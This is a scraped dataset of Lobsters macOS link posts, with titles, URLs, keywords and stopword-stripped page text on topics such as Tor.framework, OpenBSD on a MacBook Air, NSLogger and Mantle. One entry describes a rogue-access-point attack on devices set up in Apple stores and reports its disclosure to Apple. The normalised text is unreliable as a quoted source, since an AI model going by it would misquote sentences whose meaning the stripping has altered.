753,Lobsters,mac,Apple macOS,"Tor.framework, for routing WebKit and other connections in Cocoa apps through Tor",https://github.com/grabhive/Tor.framework,torframework routing webkit connection cocoa apps tor,torframework http torprojectorg important nt currently working framework hive torframework build instruction use demo app license,torframework torframework allows use tor network http torprojectorg route webkit connection make web browsing annonymous also start tor sock proxy route external connection via tor network well important nt currently working framework created hive nt used end might actually end implementing tor hive different way try use want ca nt provide support moment might better idea use one instead torframework torframework us original tor project source provide functionality mac application need access tor network need build instruction order able compile stuff need use homebrew following brew install openssl libevent brew link openssl force remember fetch tor source git submodule update init recursive ready go use torframework delivers singleton class hitormanager object able access tor network functionality manage tor sock proxy server simply run using hitormanager defaultmanager start want nsurlconnection instance route via tor network simply set routing hitormanager defaultmanager torrouting yes ready go demo app demo application included source start check use torframework license torframework available mit license
754,Lobsters,mac,Apple macOS,Signed Mac Malware Using Right-to-Left Override Trick,http://www.f-secure.com/weblog/archives/00002576.html,signed mac malware using righttoleft override trick,,
755,Lobsters,mac,Apple macOS,How OS X “Mavericks” works its power-saving magic,http://arstechnica.com/apple/2013/06/how-os-x-mavericks-works-its-power-saving-magic/,o x maverick work powersaving magic,run full hour single charge intel claimed announcement o x maverick core technology overview compressed memory academic paper app nap timer coalescing,apple exec talk new feature o x maverick yesterday worldwide developer conference wwdc keynote apple made bold claim future battery life laptop new macbook air instance run full hour single charge previous model assuming testing bear apple number company obvious part answer haswell turn part story power efficiency gain found intel new haswell cpu provide modest gain battery life gain widely expected back january intel claimed new haswell cpu featured largest generationtogeneration battery life increase history intel said chip first architecture designed ground ultrabooks tablet new chip run lower clockspeeds lower wattage le expected announcement o x maverick focus mobile power usage apple made comment keynote new technology meant enable longer battery life information appeared later day separate release core technology overview pdf document offer highlevel look maverick internals overarching goal power efficiency change course longer battery life apple claim acheive without harming case even improving overall system responsiveness three main technology make possible first compressed memory ordinarily thought power management tool compressed memory automatically compress least recently used item memory compacting half original size item needed uncompressed presented requesting program apple claim compressiondecompression cycle within memory faster swapping information disk even disk ssd thanks use old wkdm algorithm running maverick older laptop mechanical disk result even dramatic saving academic paper pdf comparing speed three live ram compression algorithm concurs concluding wkdm compress decompresses extremely fast outperforming two tested algorithm respect free overall memory increase speed compared swapping disk lower disk wear apple claim also reduces need read write virtual memory swap file disk improving power efficiency mac despite small increase cpu usage due compression decompression second technology app nap new feature clamp harder apps nt foreground one macusing editor note current version safari consumes percent cpu resource running background power loss significant default scenario aggressively throttle resource app window visible app playing audio though devs override behavior app napping o x throttle program timer limiting frequency generate significant improvement cpu idle time running application frequently check data disk network activity limited napping app receives lowest priority disk network access meant reduce disk power usage also make foreground apps responsive io throttling reduces chance background process interfere io activity app actively using say apple maverick also lower unix process priority napping app receives smaller slice cpu resource together change exert control background apps keep power consumption optout control apps designed run full power background finally apple introduces something called timer coalescing operates machine battery power o x program constantly setting timer activate cpu disk network link everything checking dhcp wifi lease running software update triggering audible alarm timer result action invisible user apps nt coordinate timer idling mac constantly awakened firing timer keeping cpu disk lowestpower idle state noncoalesced timer note power use line across bottomapple timer coalescing attempt enforce order chaos battery power maverick routinely scan upcoming timer apps set apply gentle nudge line timer fire close time coalescing behavior mean disk cpu awaken perform timerrelated task multiple apps return sleep idle longer period time next round timer fire apple never guaranteed developer timer run exact time either nt necessarily break convention apple currently tell developer various input source typical run loop manages effective resolution time interval timer limited order millisecond note busy apps may timer affected even current apps set timer instance get something within apple sound like get even approximate timer scheduling maverick apple claim technique dramatically increase amount time processor spends idling us illustrative chart show possible improvement power usage timer coalescing applied power usage line show overall idle timeapple new technology exist alongside kernellevel adjustment way cpu resource prefers use core possible leaving others totally idle long demand allows paired haswell improvement apple making dramatic claim battery life putting test
757,Lobsters,mac,Apple macOS,Mac OS X FileVault encryption and OpenBSD encrypted softraid on a Macbook Air,https://gist.github.com/jcs/5573685,mac o x filevault encryption openbsd encrypted softraid macbook air,update crammed update macos filevault encryption openbsd encrypted softraid macbook airpro installed tiny usb adapter refind macos configuration openbsd installation firmwareopenbsdorg dual booting refind todo startupsound,update broadcom wireless card macbook pro work crammed air update document used lengthy many manual step required get openbsd mac o x working together boot camp assistant bca created hybrid mbr enabled legacy bios emulation mode older version window openbsd required newer macbooks stopped supporting older version window bca support window since us gpt uefi however newer version openbsd support gpt uefi boot camp assistant longer needed boot openbsd macos filevault encryption openbsd encrypted softraid macbook airpro openbsd work pretty well least macbook air sandybridge macbook air haswell new km code brings mba edp display backlight control acpi work expected batteryac status cpu throttling full suspendresume support broadcom wireless card pro work bwfm driver installed air one use tiny usb adapter urtwn rather unobtrusive plugged broadcom multitouch trackpad supported ubcmtp driver allowing twofinger scrolling emulation clicking multiple finger brought new improved support gpt uefi usb thunderbolt least apple gigabit ethernet adapter supported bge gpt uefi support allow openbsd coexist mac o x without need boot camp assistant hybrid mbrs though refind suggested graphical boot menu choose os get os working disk encryption macos configuration encrypt drive enabling filevault convert core storage volume open disk utility click hard disk drive mac o x partition click partition click add hf partition choosing msdos type create hybrid mbr cause problem later chosen size used openbsd disk utility live resize hopefully create new partition pro tip open terminal resize tail f varlogsystemlog see output hfstruncatefs thing take half hour openbsd installation download latest openbsd installxxfs dd usb disk pro tip using usb wireless device requires firmware like urtwn download manually firmwareopenbsdorg put removable medium possibly even existing efi msdos partition otherwise wo nt network device available download firmware network device reboot mac hold alt key immediately startup chime select orange efi boot disk openbsd boot choose hell run fdisk e new hf partition already sliced disk utility change type quit disklabel e create new slice taking default new openbsd partition use raid type writequit bioctl cc l create new softraid encrypted disk justadded raid partition enter passphrase new sd device show install get back installer use whatever created root disk proceed normal prompted choose use w hole disk mbr current bootloader support mbr partition softraid device rebooting mount uefi esp partition hard drive move bootloaders openbsd installed efiboot default efi location efiopenbsd directory since dualbooting refind need see openbsd directory instead mkdir efi mount msdos efi mkdir efiefiopenbsd mv efiefibootboot efiefiopenbsd reboot mac boot back o x dual booting macos install refind per instruction reboot see graphical boot menu openbsd blowfish selecting openbsd boot usual bootloader prompting softraid passphrase todo figure disable startup chime openbsd startupsound nt seem work mountain lion anymore anyway writing something nvram
758,Lobsters,mac,Apple macOS,Light Table 0.4 Released,http://www.chris-granger.com/2013/04/28/light-table-040/,light table released,go download bit future nextgen web dev speaking snake python support sss documentation documentation literally everything else changelog teach programming plan link,today proud announce release light table go download bit future release goal bring people fold increase number language eval smooth core experience finally chance move ball forward live modifying website directly inside lt injecting code nodejs showing matplotlib graph inline huge release virtually every way think something everyone whether starting programming writing python since released let take look nextgen web dev one thing originally showed light table video ability embed work directly light table well video stick browser tab navigate page want start live modifying neat thing nt page setup work cmdctrlr refresh page anytime need obligatory meta screenshot writing post light table requested language survey javascript fair margin lot people hoping deeper j integration soon started see shifted gear made happen thanks serious intergration chromedevtools pretty impressive stuff like inspect javascript object inline console powerful thing level eval thanks devtools integration nt making call eval patching running vm mean thing impossible change runtime single cmdenter updated magically fix event handler anonymous function host thing perfect sure wo nt refresh much anymore oh speaking javascript eval nodejs process speaking snake python support sss light table support python eval work python python utilizes ipython better overall experience available video python support come complete inline resultsexceptions integration console ipython integration also able inline matplotlibpylab graph pretty neat documentation finally nice set documentation point hesitant spend much time writing documentation use light table thing still changing pretty drastically happy general workflow put together though time get content access doc within light table welcome tab doc open light table documentation command literally everything else said huge release look changelog basically every aspect lt got love big one multiple window multiple tabsets split workspace treeview track file system let standard file operation explicitly create connection connect tab greatly improved console intrafile tokenbased autocomplete dramatic performance improvement rendering faster fixed lot little thing missing slightly took away overall experience light table think find release feel better every way teach programming goal always provide environment help get started also grows powerful working environment release light table lot offer platform new programmer dramatically shortened feedback loop clean simple workflow work teaching organization kind really love hear help get student using light table shoot u email learn kodowacom plan see taste three original language set include light table plan one public release move private beta kickstarter folk release focused picking couple thing nt quite make deeper language support beta opening light table plugins exciting aspect whole thing proud launch trust even amazing stuff way link april
759,Lobsters,mac,Apple macOS,"Your Mac, iPhone or iPad may have left the Apple store with a serious security risk",http://www.troyhunt.com/2013/04/your-mac-iphone-or-ipad-may-have-left.html,mac iphone ipad may left apple store serious security risk,new favourite device wifi pineapple apple demo conundrum check online sydney apple store mac io device way viewing network device previously connected happen connecting insecure wireless network keeping customer safe easy pie technically minded beast sslstrip summary disclosure,year ago day wife walked apple store sydney cbd bought shiny new macbook air mac familiar territory u happily accepted offer staff member walk u nut bolt osx handy little starter left store none wiser machine serious security risk become apparent another year couple week ago wrote new favourite device wifi pineapple despite friendly tropical name pineapple piece cigarettepacksized professional security equipment picked online help demonstrate secure coding practice specifically helping educate web developer risk using encryption browser website communicating something need built design site among various party trick packed little piece equipment feature called karma work like connect device wireless network let imagine network named wilson purpose demonstration device continues look network perpetuity mean device laptop smart phone tablet etc running around shouting wilson wilson wilson karma say hears wilson let get connected wilson originally secured wireless password device connects pineapple automatically look like normal wireless connection made without action whatsoever user behalf know could happen written right wireless network screen every io device albeit without explaining known mean nothing access point claiming exactly device publicly broadcast looking risk device connecting pineapple similar equipment one without knowing mean every single byte data pass connection encrypted read changed attacker password personal information photo video anything else properly protected website intercepted link secure login page document email even banking website manipulated protection exist evident large number device leaving apple store connected insecure network leaving risk year come let explain apple demo conundrum wrote blog post mentioned commented whilst testing pineapple noticed unexpected traffic flowing traffic looked like wife macbook air able intercept internet traffic simply wandered range struck odd time already connected secure home wireless also much stronger signal pineapple sure enough though connected pineapple rogue access point name apple demo made note post moved weekend gone microsoft event small room dozen fellow techie people laptop hour end mac amongst participating activity day also preparing conference talk melbourne later week involve using pineapple demonstrate risk website implement sufficient security measure without giving away detail yettooccur event configured device simply see anything would connect happened probe request wifi device explained earlier essentially device calling wilson except case calling apple demo pineapple responds apple demo successful association made pineapple connected internet unencrypted communication device website visited service apps connected could logged manipulated image first last line contain partially blurred mac address uniquely identifying fingerprint network device device connected first three set two digit organisationally unique identifier tell u manufactured device check online get result surprising small amount testing done pineapple second mac connected insecure network previously associated coincidence far prevalent small sample size time visit apple store sydney apple store usually case apple sydney store impressive piece architecture amazing glass facade made appointment genius take look ipad bit time kill first thought take look display model connecting first ipad mini macbook pro although surprising reasonable validation assumption regarding origin apple demo machine seeing course main thing network still insecure padlock icon hence wifi authentication required none matter case anyway exactly anything nature want protect data using floor stock go upstairs appointment genius explain two issue genuinely ipad irk issue require internet demonstrate genius let call john exceptionally helpful promptly directs wifi setting ipad select apple store rather apple demo risk identical wireless password device happily remember name attempt reconnect time finish session leave store come home turn pineapple immediately see oncesecure ipad become vulnerable soon walked store device started looking reconnect anything would acknowledge consider consequence soon someone walk apple store receiving support highly likely attacker begin immediately monitoring internet traffic easy mac looked network property wife mac obviously stored connection apple demo really made risk hit home though looked setting network apple demo network first list take priority network came wife machine first connected apple network came straight home set even one year later machine still prioritising first network connected dropping newer one meant pineapple able hijack connection even machine already perfectly legitimate association wireless access point solution simply delete network security none easy mac much io io device little trickier io way viewing network device previously connected consequently way removing insecure one fact way forget individual network automatically reconnect selecting network range nt going people much good exactly going travel back store device forget network think might gone demo support process store matter connected unprotected wireless network need erase trusted one start scratch jump setting general reset reset network setting going make unpleasant regularly connect secure network need go retrieve password ensure io device left apple serious security risk happen connecting insecure wireless network sure go mcdonalds jump free wifi require password got exactly problem difference course mcdonalds make fast food whilst apple make device networking capability mcdonalds similar need lift game secure network course deal usability issue creates degree forgiven oversight buy brand new phone tablet laptop expect walk store secure piece equipment certainly one would take amount effort exploit happening apple connects instore real story insecure default vulnerable simple attack day one may well case store well know microsoft samsung retail outlet selling similar device offering similar setup service handle wireless connection clearly using protected network leaving consumer exactly risk keeping customer safe easy pie paradoxically little meat pie shop around corner apple gleaming architectural masterpiece pie shop nothing hole wall counter one staff member barely fit behind somehow still manage offer free wifi use ingenious mean properly securing customer work like take kindly provide customer wifi password ask entire problem disappears good work pie shop technically minded want detail key point traffic sent via http intercepted either read manipulated man middle least without resorting attack protocol beast apps make call apis ssl validate certificate good shape browsing session occur entirely http browsing session begin http safe even redirect http example simply type americanexpresscom address bar browser default unencrypted scheme read sslstrip want know webpage load login form http embed iframe within http page even login page http also risk original http request manipulated load content attacker desire rogue login page authentication cooky flagged secure sent unencrypted network also pose serious risk pineapple detect probe request wpa protected network device looking automatically even manually make association try way see name secure network listed device wifi setting initial authentication handshake occur device connect case wifi security protecting network unauthorised access protecting given client data monitoring client entirely leaving device insecure state long association network question ended summary mean simply apple helped set device provided support store exceptionally easy attacker monitor manipulate majority internet traffic pass long attacker get range wireless already done accidentally good intent multiple occasion device obviously tested device sydney store likely source one observed conference weekend know apple store location handle situation described given carbon copy design staff experience store across globe surprised practice differed still happy iphone ipad user wife happy mac user nothing product per se insecure regard information simply instore process leaf vulnerable also easily rectified simply putting password wireless password device fooled connecting rogue access point future know make slick experience currently customer way solve issue short staff manually removing connection end session unfortunately also good new device wager right thousand device australia alone left vulnerable disclosure yesterday contacted apple shared risk regarding instore practice recently learnt customer receiving support apple product store help genius connect device unprotected wireless network experience named either apple demo apple store certainly case george st store sydney association network security leaf device vulnerable inadvertently connecting rogue access point respond probe request device send specifically looking presence insecure network known short device leaf apple store connected insecure network risk attacker hijacking internet traffic trivial process easily exploited malicious intent observed first hand wife macbook air ipad well observing apple device exhibiting behaviour review comment would appreciated update post response
761,Lobsters,mac,Apple macOS,Alfred Dev Doctor - Documentation Search for Alfred,http://wmas.it/alfred-dev-doctor,alfred dev doctor documentation search alfred,need something nt support github update keithamus update cfeduke ryanplasma update ajackbot update yellowfeatheruk image optim update gist,need something nt support language framework anythingelse nt support please file pullrequest github update added caniusecom support thanks keithamus total refactor make oo easier add new parser update major bug fix added clojure autosuggest support thanks cfeduke added wordpress keyword support thanks ryanplasma update minor bug fix added ruby autosuggest support thanks ajackbot update improved rail support thanks yellowfeatheruk added image optim support using keyword optmise query update minor bug fix thanks added gist keyword search thanks
763,Lobsters,mac,Apple macOS,"Hello, this is Sequel Pro 1.0",http://www.sequelpro.com/blog/2013.01/hello-this-is-sequel-pro-1-0/,hello sequel pro,hello sequel pro donating download release note donate new goody issue tracker,hello sequel pro jan today pleased announce release sequel pro new release come beautiful new icon courtesy kenichi guy panic think new icon fantastic please download delicious new version sequel pro taste tell u think excited hear use sequel pro regular basis please consider donating project download release note donate please note changed sequel pro signed add gatekeeper compatibility allow sequel pro access keychain password favorite prompted new goody much intuitive favourite handling editing connection screen folder inline savingconnection testing swedish french japanese localisation new quick connect feature connection screen much improved connection stability handling speed improvement new goody discover read full release note spoiler lot retina icon goodness find bug please add issue tracker
764,Lobsters,mac,Apple macOS,"""Fixing"" Slow Wake for MacBook Pro w/ Retina Display",http://www.ewal.net/2012/09/09/slow-wake-for-macbook-pro-retina/,fixing slow wake macbook pro w retina display,standby,main machine macbook pro w retina display carry work every day use throughout day mostly meeting home use connected inch thunderbolt display power laptop charge battery love almost everything laptop one thing getting nerve often painfully slow wake open lid opening lid pretty instantly show password dialog box ui lie reality immediately shown screenshot screen looked like went sleep ui although visible functional almost second easily tell happening watching clock display upper right display right opening lid show incorrect time time laptop went sleep second time become accurate signal actually start typing password unlock laptop actually happening new macbook pro recent macbook air new powersaving mode apple call standby standby mode kick laptop normal sleep mode hour happens content ram written hard drive ram powered extend battery life theory laptop last day standby mode trade waking take long time reload gb ram hard drive even ssd note laptop sleep le hour wake nearly instantly seen case close lid briefly walking meeting fact key workaround turn hour delay configurable changed standby delay machine hour hour running command terminal window second hour sudo pmset standbydelay given plug laptop thunderbolt display every night recharges battery nt care much standby feature keeping battery alive day theory may go trip something standby mode may useful nt disable completely done setting delay setting hour standby almost never happen normal day day usage pattern almost always instant wake time may hour unnecessarily long hour would worked well providing little better balance battery life day day convenience time tell p want see current setting run command terminal pmset g
765,Lobsters,mac,Apple macOS,"NSLogger: A flexible, modern logging tool for iOS",https://github.com/fpillet/NSLogger,nslogger flexible modern logging tool io,nslogger nslogger nslogger viewer nslogger basic usage swift objectivec installation step step step desktop viewer download nslogger desktop viewer client framework install cocoapods install cocoapods carthage install advanced usage using nslogger shared network set logger option manual framework install connection work advanced desktop viewer feature regular expression matching marker mac o x later advanced color configuration high performance low overhead credit new bsd licence louis harboe,nslogger nslogger high performance logging utility display trace emitted client application running macos io android replaces traditional console logging trace nslog java log nslogger viewer run macos replaces xcode android studio eclipse console provides powerful addition like display filtering defining log domain level image binary logging message coloring trace buffering timing information link source code etc nslogger feature summary view log using desktop application log sent device simulator accept connection local network client using bonjour remote client connecting directly internet online application running connected nslogger offline saved log log viewing buffer trace memory file send viewer connection acquired define log domain app view model controller importance level error warning debug color log message using regexp log image raw binary data secure logging connection use ssl default advanced log filtering option save viewer log share andor review later export log text file open raw buffered trace file brought back client application directly connected log viewer look like action macos mojave later dark mode basic usage without change code nslog log application redirected nslogger desktop viewer viewer found automatically network using bonjour rich api let log message binary data image lot detail simple wrapper available convenience swift wrapper api import nslogger logging message loggersharedlog network info checking paper logging image loggersharedlog view noise myprettyimage logging data loggersharedlog custom domain noise somedataobject objectivec wrapper api import nsloggernsloggerh loggerapp hello world today self mydate loggernetwork hello world today self mydate installation step download nslogger desktop app mac step add nslogger framework project step step desktop viewer download download prebuilt signed version nslogger desktop viewer macos nt forget launch application mac wo nt show window client connects start logging client framework install cocoapods install project configured use cocoapods add line podfile includes c objc apis suitable use application without swift code swift syntactic sugar apis added swift subspec developing code swift mixed swift objc environment use note nt strictly need include swift variant swift application perfectly develop extension call nslogger c apis without using basic provided one finally using framework library may use nslogger use nostrip variant force linker keep nslogger function final build even code nt use since linked framework may dynamically check presence nslogger function required linker would nt see use carthage install nslogger carthagecompatible build two framework nslogger nsloggerswift need pick either one use application used swift nsloggerswift variant add simple swift layer make nslogger easier use swift code perfectly develop extension call nslogger c apis without using basic provided one use nslogger framework depending framework choose code need import nslogger import nsloggerswift difference cocoapods support always import nslogger github fpilletnslogger run nsloggerxcodeproj toplevel project offer two target nslogger nsloggerswift add built framework suit need advanced usage using nslogger shared network first log sent nslogger start logger default first bonjour service encountered multiple nslogger user share network logger connection get mixed avoid confusion user add app start example applicationdidfinishlaunching method loggersetupbonjourforbuilduser preference pane nsloggerapp desktop viewer go network tab type user name ie user bonjour service name text field allow trace received computer user compiled app work nslogger added project using cocoapods set logger option example nt want disable osactivitymode scheme need log wan na log nslogger swift call init function func loggerinit let pointer loggergetdefaultlogger var option loggergetoptions pointer option kloggeroptioncapturesystemconsole disable option loggersetoptions pointer option manual framework install using nslogger without cocoapods add loggerclienth loggerclientm loggercommonh well add cfnetworkframework systemconfigurationframework framework io mac o x application replace nslog call logmessagecompat call recommend using macro turn log building distribution version application connection work automatic discovery desktop viewer application must run device network mac app start logging nslogger framework automatically default look desktop viewer using bonjour soon trace start coming new window open mac advanced user setup remote host port log client specific host specify bonjour name case multiple viewer network advanced desktop viewer feature desktop viewer application provides tool like filter regular expression matching let perform data mining log timing information message display time elapsed since previous message filtered display get sense time event application image binary data display directly log window marker client connected place marker end log clearly see happens afterwards example place marker pressing button application fast navigation log display export log text optional display file line function uncluttered display log saved nsloggerdata file reloaded later logging file name log file extension rawnsloggerdata nslogger reopen process client remotely generating raw logger data file send investigate postmortem note nslogger mac o x viewer requires mac o x later advanced color configuration apply color tag message using regular expression define color use standard nscolor name example blue hex color example add prefix bold example bold red high performance low overhead nslogger framework run thread application try hard consume cpu memory possible desktop viewer found yet trace buffered memory connection acquired allows tracing difficult situation example device wakeup time network connection running credit nslogger copyright c florent pillet right reserved wrong revenged released new bsd licence nslogger icon copyright c louis harboe
766,Lobsters,mac,Apple macOS,Boxer 1.4 emulates a 24-pin dot matrix parallel printer,http://boxerapp.com/blog/2012/11/12/pc-load-letter/,boxer emulates dot matrix parallel printer,ibm ppds epson impedance mismatch,several month big noisy feature work needed blow little steam past weekend pottering away feature knew would use approximately people guess feature could right boxer emulates dot matrix parallel printer compatible ibm ppds epson printer language popular do heyday mean do app print text do app driver ibm proprinter epson lxlqseries printer including word work wordperfect others print graphic authentically shitty graphic see like old day emulation built thirdparty printer emulation patch floating around dosbox rewritten objectivec cocoa native pdf support sprinkled ui magic help medicine go boxer us standard o x print panel print pdf file straight real printer boxer generates actual pdf data pdfs save fully vectorised selectable text impedance mismatch one challenge printer emulation print workflow do program quite different roll day printing o x done discrete print job representing set page entire document do program squirt text graphic printer linebyline notion print job formal indication actually done printing mean human decide printing done mean need able see printer do program start printing boxer brings live animated print preview showing coming emulated printer emulated printer idle couple second boxer let print discard page far keep printing page add print job ready hit print boxer wrap print job hand o x print panel honest print preview reason implemented whole feature fun design challenge way make printer emulation instead call design narcissism
767,Lobsters,mac,Apple macOS,KVC Collection Operators : NSHipster,http://nshipster.com/kvc-collection-operators/,kvc collection operator nshipster,sleek new object literal fast enumeration expression keyvalue coding kvc collection operator simple collection operator object operator array set operator simple collection operator object operator array set operator probably terrible idea apple documentation kvc collection operator note guy english pretty amazing post swizzle dsl,rubyists laugh objectivec bloated syntax although lost pound summer sleek new object literal redheaded bully still taunt u map oneliners fancy symbol toproc really lot elegant clever language come well avoids loop even fast enumeration expression drag matter sugarcoat loop block code something much simpler describe natural language get average salary employee array double totalsalary employee employee employee totalsalary employeesalary doublevalue double averagesalary totalsalary employee count meh fortunately keyvalue coding give u much employee valueforkeypath avgsalary kvc collection operator allows action performed collection using key path notation valueforkeypath time see key path denotes particular aggregate function whose result returned chained like key path collection operator fall one three different category according kind value return simple collection operator return string number date depending operator object operator return array array set operator return array set depending operator best way understand work see action consider product class product array following data interface product nsobject property nsstring name property double price property nsdate launchedon end keyvalue coding automatically box unboxes scalar nsnumber nsvalue necessary make everything work name price launch date iphone september ipad mini november macbook pro june imac november simple collection operator count return number object collection nsnumber sum convert object collection double computes sum return sum nsnumber avg take double value object collection return average value nsnumber max determines maximum value using compare object must support comparison one another work min max return minimum value collection example product valueforkeypath count product valueforkeypath sumprice product valueforkeypath avgprice product valueforkeypath maxprice product valueforkeypath minlaunchedon june get aggregate value array set nsnumber value simply pas self key path operator example valueforkeypath maxself produce value object operator let say inventory array representing current stock local apple store running low ipad mini new imac shipped yet nsarray inventory ipadmini macbookpro macbookpro unionofobjects distinctunionofobjects return array object property specified key path right operator distinctunionofobjects remove duplicate whereas unionofobjects example inventory valueforkeypath unionofobjectsname iphone iphone iphone ipad mini macbook pro macbook pro inventory valueforkeypath distinctunionofobjectsname iphone ipad mini macbook pro array set operator array set operator similar object operator work collection nsarray nsset would useful example compare inventory several store say applestoreinventory previous example verizonstoreinventory sell iphone ipad mini stock distinctunionofarrays unionofarrays return array containing combined value array collection specified key path right operator expect distinct version remove duplicate value distinctunionofsets similar distinctunionofarrays expects nsset containing nsset object return nsset set contain duplicate value anyway distinct operator example applestoreinventory verizonstoreinventory valueforkeypath distinctunionofarraysname iphone ipad mini macbook pro probably terrible idea curiously apple documentation kvc collection operator go way make following point note currently possible define collection operator make sense spell since people thinking see collection operator first time however turn actually possible little help friend objcruntime guy english pretty amazing post wherein swizzle valueforkeypath parse customdefined dsl extends existing offering interesting effect nsarray name allemployees valueforkeypath collect daysoff name code would get name anyone taken fewer day remind take vacation doubt taken ridiculous extreme nsarray albumcovers record valueforkeypath collect artist like bon iver nsunarchivefromdatatransformername albumcoverimagedata eat heart ruby oneliner filter record collection artist whose name match bon iver initializes nsimage album cover image data matching album good idea probably nspredicate rad breaking complicated logic underrated insanely cool bet clever example shown possible direction future objectivec dsl metaprogramming kvc collection operator mustknow anyone want save extra line code look cool process scripting language like ruby boast considerably flexibility oneliner capability perhaps take moment celebrate restraint built objectivec collection operator ruby hella slow amiright troll
768,Lobsters,mac,Apple macOS,Heard - a Mac application that locally records what you listen to in iTunes,http://macwright.org/2012/10/01/heard.html,heard mac application locally record listen itunes,update post published prepperstyle music hoarding heard lastfm json glory day audioscrobbler lastfm tinfoil hat lastfm acquired cbs music group founder left kind drama forking data riaa streaming subscription pandora audioscrobberapp released open source lastgraph made accessible oh god terrible lisp factor csv minute core data underscorem cocoapods minute automatic reference counting visualization raphael treegraph made recent recently post song chain simple forcedirected graph song duration histogram champagne real friend justin cocoa love get turn gatekeeper issue tracker tmcwheard project github,update post published heard longer developed availablei use swinsian listening music itunes music setup described prepperstyle music hoardingheard native mac application sits menu bar record listen itunesit small part lastfm want record start song long song artist et cetera antisocial nothing cloud use case le precise social sharing discovery main endproduct ability export song jsonthe glory day audioscrobbler lastfm tinfoil hatsi eager user audioscrobber became lastfm acquired cbs music group founder left kind drama possibly forking data riaa tinfoilhat wearing user itunes library entirely purchased itunes music store understandably ran away new feature tried implement like streaming subscription seemed like moneymaking proposition pandoralistening audience rather feature datahoarding programmertypes like myselfbut credit audioscrobberapp released open source provided aha moment get heard work plus lastgraph introduced world streamgraph later made accessible god terriblethis app took really long time write embarrassing amount timei really recommend writing mac apps even though possibly experience invokes unending puzzlement rage wild writing lisp factor practical mindbendy infuriating guaranteed take comfort zoneinitially heard wrote csv file like minute switched core data started without library eventually acquired underscorem attendant cocoapods dependency minute written automatic reference counting relearn property memory management something simple opening window took hour trial find threeline implementation worksa song recorded heard album water artist future island duration id minute name water rating null visualizationlike minute heard openended produce simple data easily charted raphael whatever handya example graphic would treegraph made recent recently post song chain simple forcedirected graph quick song duration histogram champagne real friendsthere turningpoint aha momentsjustin helped tremendously dumb questionscocoa love explained whole application support folder thingget itthis opensource software free signed need either rightclick controlclick click open turn gatekeeper using mountain lionit almost certainly bug could use lot refinement head issue tracker got something report file pull request got something contribute tmcwheard project github
769,Lobsters,mac,Apple macOS,fusuma - window management for OSX written in MacRuby,https://github.com/glucero/fusuma,fusuma window management osx written macruby,fusuma nt like ruby shut xcode pop open vimemacssublimetextmatenano jump fusuma fusuma ca nt work todo wan na helpplay macruby afloat shadowkiller license,fusuma fusuma written macruby nt like ruby nibsxibs compiled binary anything else get make regular osx project apple tool shut xcode pop open vimemacssublimetextmatenano jump fusuma keep track unique window application position resize window activate set focus window automatically tile organize window based configured layout rule assign global hot key action fusuma ca nt remove window decoration another application work example configuration configurationjson layout layout matched active display smallworkspace primary monitor largeworkspace secondary monitor keymap keymap action reference method keymaprb setmainwindow returncommandshift swapfocusedwindowwithmain spacecommandshift removeallwindows qcommandshift rotatelayoutcounterclockwise kcommandshift warning rotatelayoutclockwise jcommandshift keymaps global map carefully activatepreviouswindow hcommandshift warning activatenextwindow lcommandshift zoomactivewindow zcommandshift example layout mylayoutjson name mylayout layout defines scale scale use layout many origin different display dimension size layout frame defines layout frame window maximum number window controlled position window layout dimension frame maximize window position dimension two window layout frame split desktop middle main window position secondary window left dimension todo clean documentation ongoing todo item default layout keymaps multilayoutmonitor support observer notify fusuma window openscloseschanges state fix sizing fixedratio window like terminal editor fixed width font like macvimemacs even possible finish packagingconfiguration yawn wan na helpplay download install latest macruby recommended required install afloat shadowkiller turn window shadow fork fusuma edit defaultconfigurationjson create configuration buildapp pathtomyconfiguration buildapp like use default configuration open fusumaapp double click hax important step license copyright c gino lucero permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
770,Lobsters,mac,Apple macOS,GitHub's Mantle: a Model Framework for Objective-C,https://github.com/blog/1299-mantle-a-model-framework-for-objective-c,github mantle model framework objectivec,username autocompletion notification center support mantle next blog post rebel typical model object github api github issue use core data concurrency huge headache still lot boilerplate hard get right mtlmodel mtlmodel extension getting involved check readme,lately shipping github mac ever username autocompletion notification center support door releasing two framework helped make happen post talk mantle framework make dead simple create flexible easytouse model layer cocoa cocoa touch next blog post talk rebel framework improving appkit first let explore would even want framework wrong way model object usually written objectivec typical model object let use github api demonstration would one typically represent github issue objectivec typedef enum nsuinteger ghissuestateopen ghissuestateclosed ghissuestate interface ghissue nsobject nscoding nscopying property nonatomic copy readonly nsurl url property nonatomic copy readonly nsurl htmlurl property nonatomic copy readonly nsnumber number property nonatomic assign readonly ghissuestate state property nonatomic copy readonly nsstring reporterlogin property nonatomic copy readonly nsstring assigneelogin property nonatomic copy readonly nsdate updatedat property nonatomic copy nsstring title property nonatomic copy nsstring body id initwithdictionary nsdictionary dictionary end implementation ghissue nsdateformatter dateformatter nsdateformatter dateformatter nsdateformatter alloc init dateformatterlocale nslocale alloc initwithlocaleidentifier enusposix dateformatterdateformat yyyymmddthh mm s z return dateformatter id initwithdictionary nsdictionary dictionary self self init self nil return nil url nsurl urlwithstring dictionary url htmlurl nsurl urlwithstring dictionary htmlurl number dictionary number dictionary state isequaltostring open state ghissuestateopen else dictionary state isequaltostring closed state ghissuestateclosed title dictionary title copy body dictionary body copy reporterlogin dictionary user login copy assigneelogin dictionary assignee login copy updatedat selfclassdateformatter datefromstring dictionary updatedat return self id initwithcoder nscoder coder self self init self nil return nil url coder decodeobjectforkey url htmlurl coder decodeobjectforkey htmlurl number coder decodeobjectforkey number state coder decodeunsignedintegerforkey state title coder decodeobjectforkey title body coder decodeobjectforkey body reporterlogin coder decodeobjectforkey reporterlogin assigneelogin coder decodeobjectforkey assigneelogin updatedat coder decodeobjectforkey updatedat return self void encodewithcoder nscoder coder selfurl nil coder encodeobject selfurl forkey url selfhtmlurl nil coder encodeobject selfhtmlurl forkey htmlurl selfnumber nil coder encodeobject selfnumber forkey number selftitle nil coder encodeobject selftitle forkey title selfbody nil coder encodeobject selfbody forkey body selfreporterlogin nil coder encodeobject selfreporterlogin forkey reporterlogin selfassigneelogin nil coder encodeobject selfassigneelogin forkey assigneelogin selfupdatedat nil coder encodeobject selfupdatedat forkey updatedat coder encodeunsignedinteger selfstate forkey state id copywithzone nszone zone ghissue issue selfclass allocwithzone zone init issue url selfurl issue htmlurl selfhtmlurl issue number selfnumber issue state selfstate issue reporterlogin 